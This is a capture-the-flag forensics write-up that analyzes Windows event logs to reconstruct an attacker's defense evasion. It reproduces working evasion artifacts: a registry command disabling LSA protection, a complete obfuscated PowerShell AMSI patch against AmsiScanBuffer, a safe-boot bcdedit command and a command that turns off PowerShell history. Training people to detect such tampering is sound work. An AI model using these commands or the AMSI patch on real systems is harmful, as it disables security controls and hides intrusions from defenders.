# Synopsis

In Smoke & Mirrors, players analyze the provided event logs and forensic artifacts to uncover how the attacker disabled or altered security features. They must identify the tools, commands, or scripts used to reduce visibility and reconstruct the methods the attacker used to operate undetected.

# Description

Byte Doctor Reyes is investigating a stealthy post-breach attack where several expected security logs and Windows Defender alerts appear to be missing. He suspects the attacker employed defense evasion techniques to disable or manipulate security controls, significantly complicating detection efforts.

Using the exported event logs, your objective is to uncover how the attacker compromised the system's defenses to remain undetected.

## Skills Required

- Basic Windows OS knowledge
## Skills Learned

- Understand and recognize malicious use of PowerShell cmdlets
- Analyze and interpret Windows Registry modifications
- Identify how attackers disable or tamper with Windows security features

# Solve

```
EvtxECmd.exe -f "C:\Users\murph\Downloads\OperationBlackout\smoke_and_mirrors\Microsoft-Windows-Powershell.evtx" --csv "C:\Users\murph\Downloads\OperationBlackout"

EvtxECmd.exe -f "C:\Users\murph\Downloads\OperationBlackout\smoke_and_mirrors\Microsoft-Windows-Powershell-Operational.evtx" --csv "C:\Users\murph\Downloads\OperationBlackout"

EvtxECmd.exe -f "C:\Users\murph\Downloads\OperationBlackout\smoke_and_mirrors\Microsoft-Windows-Sysmon-Operational.evtx" --csv "C:\Users\murph\Downloads\OperationBlackout"
```


# Flag 1
The attacker disabled LSA protection on the compromised host by modifying a registry key. What is the full path of that registry key?

```
HKLM\SYSTEM\CurrentControlSet\Control\LSA

The description for Event ID 1 from source Microsoft-Windows-Sysmon cannot be found. Either the component that raises this event is not installed on your local computer or the installation is corrupted. You can install or repair the component on the local computer.

If the event originated on another computer, the display information had to be saved with the event.

The following information was included with the event: 

-
2025-04-10 06:29:16.703
EV_RenderedValue_2.00
9540
C:\Windows\System32\reg.exe
10.0.26100.1882 (WinBuild.160101.0800)
Registry Console Tool
Microsoft® Windows® Operating System
Microsoft Corporation
reg.exe
"C:\WINDOWS\system32\reg.exe" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
C:\WINDOWS\system32\
DESKTOP-M3AKJSD\User
EV_RenderedValue_13.00
1201878
1
High
MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771
EV_RenderedValue_18.00
9808
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
DESKTOP-M3AKJSD\User

The message resource is present but the message was not found in the message table

```

# Flag 2
Which PowerShell cmdlet controls Windows Defender?
```
Set-MpPreference
```

# Flag 3
The attacker loaded an AMSI patch written in PowerShell. Which function in the amsi.dll is being patched by the script to disable AMSI? Hint: The script in question imports 'kernel32.dll'

```
Creating Scriptblock text (1 of 1):
function Disable-Protection {
    $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static bool Patch() {
        IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
        if (h == IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
        if (a == IntPtr.Zero) return false;
        UInt32 oldProtect;
        if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, a, patch.Length);
        return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"@
    Add-Type -TypeDefinition $k
    $result = [P]::Patch()
    if ($result) {
        Write-Output "Protection Disabled"
    } else {
        Write-Output "Failed to Disable Protection"
    }
}

ScriptBlock ID: a40a685c-b1e5-495e-b69a-3542da1e6c22
Path: 
```

Important Parts
```
IntPtr h = GetModuleHandle("amsi.dll");
if (h == IntPtr.Zero) return false;

IntPtr a = GetProcAddress(h, "AmsiScanBuffer");
if (a == IntPtr.Zero) return false;
```

So in summary:
- The script **explicitly gets the address of `AmsiScanBuffer`** in `amsi.dll`.
- The patch is applied at that address.
- This clearly shows **`AmsiScanBuffer`** is the function being patched.

# Flag 4

```
bcdedit /set safeboot network
```

![](Images/Pasted%20image%2020250523094937.png)

# Flag 5
Which PowerShell command did the attacker use to disable PowerShell command history logging?

Most common
- Set-PSReadLineOption
- HistorySavePath
- MaximumHistoryCount
-
![](Images/Pasted%20image%2020250523095138.png)

```
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

![](Images/Pasted%20image%2020250523095306.png)